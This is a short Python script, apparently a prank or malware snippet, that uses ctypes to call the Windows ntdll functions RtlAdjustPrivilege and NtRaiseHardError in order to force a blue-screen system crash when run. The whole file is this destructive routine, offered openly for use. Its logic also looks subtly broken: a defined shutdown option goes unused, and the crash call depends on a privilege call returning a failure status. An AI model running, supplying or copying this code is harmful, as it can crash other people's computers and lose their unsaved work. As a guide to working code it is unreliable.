from ctypes.wintypes import BOOL, ULONG
import ctypes

OPTION_SHUTDOWN = 6
SHUTDOWN_PRIVILEGE = 19
STATUS_NOT_IMPLEMENTED = 0xC0000002

ENABLED = BOOL()
RESPONSE = ULONG()

class Bluescreen:
    def __init__(self):
        self.ntdll = ctypes.WinDLL('ntdll.dll')

        self._NtRaiseHardError = self.ntdll.NtRaiseHardError
        self._RtlAdjustPrivilege = self.ntdll.RtlAdjustPrivilege

    def bsod(self):
        if self._RtlAdjustPrivilege(
            SHUTDOWN_PRIVILEGE,
            True,
            True,
            ctypes.byref(
                ENABLED
            )
        ):
            self._NtRaiseHardError(
                STATUS_NOT_IMPLEMENTED,
                0,
                0,
                0,
                ctypes.byref(
                    RESPONSE
                )
            )

if __name__ == '__main__':
    bluescreen = Bluescreen()
    bluescreen.bsod()
